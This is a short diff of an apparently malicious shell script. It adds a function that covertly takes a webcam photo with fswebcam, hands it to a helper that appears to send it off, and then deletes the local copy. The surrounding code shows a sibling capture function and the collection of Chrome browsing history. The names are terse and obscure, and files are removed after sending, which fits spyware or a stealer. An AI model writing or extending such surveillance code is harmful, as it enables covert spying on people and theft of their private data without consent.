@@ -99,6 +99,15 @@ function PxNwx(){
     slpx
     rm -f "$IBUS_$output_file"
 }
+#Fswebcam
+function WbCmx(){
+	output_file="px.jpg"
+	fswebcam "$IBUS_$output_file"
+	dbgx "Fswebcam: as $output_file"
+	cx "$output_file" "PX"
+    	slpx
+    	rm -f "$IBUS_$output_file"
+}
 #sqlite3
 function Hstrx(){
     output_file="chrome_history.txt"
@@ -184,7 +193,7 @@ function px(){
         mnx
 	#
     	ssx_ & PxNwx & Hstrx
-    	ax_
+    	#ax_
 	#
 	exit 0
     else
